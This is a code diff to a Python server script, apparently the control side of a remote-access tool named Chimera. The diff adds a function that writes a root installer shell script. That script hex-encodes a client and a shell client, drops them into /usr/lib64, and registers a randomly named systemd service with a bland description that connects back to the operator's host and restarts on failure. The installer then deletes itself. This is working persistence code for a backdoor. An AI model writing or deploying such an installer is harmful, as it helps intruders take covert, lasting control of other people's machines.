@@ -5,8 +5,71 @@ import random
 import time
 import os
 
+def createInstaller(host):
+    if(os.path.exists('./client.py') and os.path.exists('./shellClient.py')):
+        print("Creating installer located at ./installer.sh...")
+        f = open('./client.py', 'r')
+        clientConts = f.read()
+        f.close()
+        f = open('./shellClient.py')
+        shellConts = f.read()
+        f.close()
+        f = open('./installer.sh', 'w')
+        
+        contents = f"""
+#!/bin/bash     
+CLIENTCONTS={clientConts.encode().hex()}
+SECCLIENTCONTS={shellConts.encode().hex()}
+
+CLIENTCONTS="$(printf "%b" "$(echo "$CLIENTCONTS" | sed 's/\(..\)/\\x\1/g')")"
+SECCLIENTCONTS="$(printf "%b" "$(echo "$SECCLIENTCONTS" | sed 's/\(..\)/\\x\1/g')")"
+SERVICENAME=str=$(tr -dc 'a-z' < /dev/urandom | head -c6)
+
+SERVICEFILE="/lib/systemd/system/"+$SERVICENAME+".service"
+
+cat << EOFA > $SERVICEFILE
+[Unit]
+Description=Stuff 'n things.
+
+[Service]
+Type=simple
+Restart=on-failure
+Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
+ExecStart=/usr/bin/python3 /usr/lib64/chimera.py "{host}"
+StartLimitInterval=1s
+StartLimitBurst=999
+
+[Install]
+WantedBy=multi-user.target
+EOFA
+
+touch /usr/lib64/chimera.py
+touch /usr/lib64/shell.py
+
+echo "$CLIENTCONTS" >> /usr/lib64/chimera.py
+echo "$SECCLIENTCONTS" >> /usr/lib64/shell.py
+
+chmod +x /usr/lib64/chimera.py
+chmod +x /usr/lib64/shell.py
+
+systemctl daemon-reload
+systemctl enable "$SERVICENAME"
+systemctl start "$SERVICENAME"
+
+rm $0
+"""
+        f.write(contents)
+        f.close()
+        print("Installer creation complete. Open the installer file to view the service name as it is a length-6 string of random letters")
+
 if (len(sys.argv) != 2):
-    print("Usage: server.py {ip to listen on}")
+    print("""
+Usage: server.py {ip to listen on}
+OR: server.py -s {ip of server}     |     This will create an install file for the current client.py and shellClient.py files. Simply transfer the install file to the remote machine and run it (as root) and it'll install Chimera
+""")
+    exit
+elif (sys.argv[1] == "-s"):
+    createInstaller(sys.argv[2])
     exit
 else:
     LISTEN_IP = sys.argv[1]
